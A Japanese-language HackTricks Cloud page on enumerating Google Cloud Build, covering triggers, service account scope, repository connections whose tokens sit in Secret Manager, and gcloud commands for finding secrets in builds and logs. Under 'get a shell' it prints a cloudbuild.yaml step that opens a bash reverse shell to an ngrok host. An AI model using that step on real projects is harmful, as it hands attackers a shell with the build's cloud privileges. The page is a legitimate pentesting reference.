# GCP - Cloud Build Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

Google Cloud Buildは、**ソースコードリポジトリ**と統合し、多様なプログラミング言語をサポートする管理されたCI/CDプラットフォームで、**ソフトウェアビルド**とリリースプロセスを**自動化**します。開発者がコードを自動的にビルド、テスト、デプロイできるようにしながら、ビルドステップとワークフローをカスタマイズする柔軟性を提供します。

各Cloud Buildトリガーは、**Cloudリポジトリに関連しているか、外部リポジトリ（Github、Bitbucket、Gitlab）に直接接続されています**。

{% hint style="success" %}
Github/BitbucketのトークンをここやCloudリポジトリから盗む方法は見つけられませんでした。なぜなら、リポジトリがダウンロードされるときは[https://source.cloud.google.com/](https://source.cloud.google.com/)のURLを介してアクセスされ、Githubはクライアントによってアクセスされないからです。
{% endhint %}

### イベント

Cloud Buildは以下の場合にトリガーされます:

* **ブランチへのプッシュ**: ブランチを指定
* **新しいタグのプッシュ**: タグを指定
* **プルリクエスト**: PRを受け取るブランチを指定
* **手動呼び出し**
* **Pub/Subメッセージ:** トピックを指定
* **Webhookイベント**: HTTPS URLが公開され、リクエストはシークレットで認証される必要があります

### 実行

3つのオプションがあります:

* 実行するコマンドを**指定するyaml/json**。通常は: `/cloudbuild.yaml`
* ウェブコンソールとCLIで「インライン」で指定できる唯一のオプション
* 最も一般的なオプション
* 認証されていないアクセスに関連する
* ビルドする**Dockerfile**
* ビルドする**Buildpack**

### SA権限

**サービスアカウントは`cloud-platform`スコープを持っており**、すべての権限を**使用できます**。**SAが指定されていない場合**（例えばsubmitを行うとき）、デフォルトのSA `<proj-number>@cloudbuild.gserviceaccount.com`が**使用されます**。

デフォルトでは権限は与えられていませんが、簡単にいくつかの権限を与えることができます:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### 承認

ビルド実行に承認が必要なCloud Buildを設定することが可能です（デフォルトでは無効）。

### 接続 & リポジトリ

接続は以下を通じて作成できます:

* **GitHub:** OAuthプロンプトが表示され、**Githubトークンを取得するための権限を求められます**。その後、**Secret Manager**内にトークンが保存されます。
* **GitHub Enterprise:** **GithubApp**のインストールを求められます。GitHub Enterpriseホストからの**認証トークン**が作成され、このプロジェクトの**Secret Manager**シークレットとして保存されます。
* **GitLab / Enterprise:** **APIアクセストークンとRead APIアクセストークンを提供する必要があります**。これらは**Secret Manager**に保存されます。

接続が生成されると、Githubアカウントがアクセス権を持っているリポジトリにリンクするために使用できます。

このオプションは以下のボタンから利用可能です:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
この方法で接続されたリポジトリは、**2世代目を使用するトリガーでのみ利用可能である**ことに注意してください。
{% endhint %}

### リポジトリの接続

これは**`connection`**と同じではありません。これにより、**GithubやBitbucket**リポジトリにアクセスする**異なる**方法が可能になりますが、接続オブジェクトは生成されませんが、リポジトリオブジェクト（1世代目）は生成されます。

このオプションは以下のボタンから利用可能です:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### ストレージ

Cloud Buildは、トリガーのためのファイルを保存する新しいストレージを**生成することがあります**。これは例えば、GCPが提供する例で発生します:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### シェルを取得

Storageバケット[security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox)が作成され、使用するファイルが含まれた`.tgz`を保存します。
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 列挙

ビルド設定とログに**機密情報が見つかる可能性があります**。
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 権限昇格

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 認証されていないアクセス

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### 攻撃後の活動

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSのハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
